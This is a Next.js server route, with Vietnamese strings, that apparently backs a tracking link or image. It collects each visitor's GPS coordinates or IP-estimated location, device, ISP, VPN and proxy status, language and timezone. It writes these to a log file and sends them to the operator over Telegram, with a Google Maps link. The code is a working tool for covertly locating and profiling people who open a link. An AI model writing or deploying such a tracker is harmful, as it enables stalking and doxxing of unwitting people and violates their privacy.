
import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { headers } from 'next/headers';
import { getAddress, getAddressFromIp, sendTelegramNotification } from '@/lib/server-utils';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { lat, lon, acc, ip, from, language, timezone } = body;

    const headersList = headers();
    const ua = headersList.get('user-agent') ?? 'unknown';
    
    const clientIp = ip || headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
    
    const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;

    const timestamp = new Date().toISOString();
    const sourceText = from === 'image' ? 'Ảnh' : 'Link';
    
    let logData = `--- [${timestamp}] MỚI TRUY CẬP ---\n`;
    logData += `Nguồn: ${from || 'link'}\n`;
    logData += `Thiết bị: ${ua}\n`;
    logData += `Địa chỉ IP: ${finalIp}\n`;

    let telegramMessage = `*🔔 Truy cập mới (${sourceText})!*\n\n`;
    telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}\`\n`;
    telegramMessage += `*Thiết bị:* \`${ua}\`\n`;
    telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
    
    // Always fetch and add IP info
    const ipInfo = await getAddressFromIp(finalIp);
    if (ipInfo.isp) {
        const ispDetails = [ipInfo.isp, ipInfo.org, ipInfo.as].filter(Boolean).join(' - ');
        logData += `ISP: ${ispDetails}\n`;
        telegramMessage += `*ISP:* \`${ispDetails}\`\n`;
    }
    const ipFlags = [
        ipInfo.mobile ? 'Mobile' : null,
        ipInfo.proxy ? 'Proxy/VPN' : null,
        ipInfo.hosting ? 'Hosting' : null,
    ].filter(Boolean).join(', ');
    if (ipFlags) {
        logData += `Loại IP: ${ipFlags}\n`;
        telegramMessage += `*Loại IP:* \`${ipFlags}\`\n`;
    }

    logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
    logData += `Múi giờ: ${timezone || 'N/A'}\n`;
    telegramMessage += `*Ngôn ngữ:* \`${language || 'N/A'}\`\n`;
    telegramMessage += `*Múi giờ:* \`${timezone || 'N/A'}\`\n`;

    if (lat !== undefined && lon !== undefined) {
      const address = await getAddress(lat, lon);
      const maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
      
      logData += `Tọa độ: ${lat}, ${lon}\n`;
      logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
      logData += `Địa chỉ: ${address}\n`;
      logData += `Link Google Maps: ${maps_link}\n`;

      telegramMessage += `*Vị trí (GPS):* ${address}\n`;
      telegramMessage += `*Tọa độ:* \`${lat}, ${lon}\`\n`;
      telegramMessage += `*Độ chính xác:* \`${acc || 'N/A'}m\`\n`;
      telegramMessage += `*Bản đồ:* [Mở Google Maps](${maps_link})\n`;
    } else {
      // Fallback to IP Geolocation
      const maps_link = (ipInfo.lat && ipInfo.lon) ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}` : 'N/A';

      logData += `Tọa độ: N/A (Bị từ chối)\n`;
      logData += `Độ chính xác: N/A\n`;
      logData += `Địa chỉ: ${ipInfo.address} (Ước tính từ IP)\n`;
      logData += `Link Google Maps: ${maps_link}\n`;

      telegramMessage += `*Vị trí (IP):* ${ipInfo.address}\n`;
      if (maps_link !== 'N/A') {
        telegramMessage += `*Bản đồ (Ước tính):* [Mở Google Maps](${maps_link})\n`;
      }
    }
    
    logData += `----------------------------------\n`;

    const logDir = path.join(process.cwd(), 'logs');
    const logFile = path.join(logDir, 'tracking_logs.txt');
    
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }

    fs.appendFileSync(logFile, logData, 'utf-8');
    
    sendTelegramNotification(telegramMessage);
    
    return NextResponse.json({ status: 'ok' });
  } catch (error) {
    console.error('Failed to log location:', error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Failed to process request', details: errorMessage }, { status: 500 });
  }
}
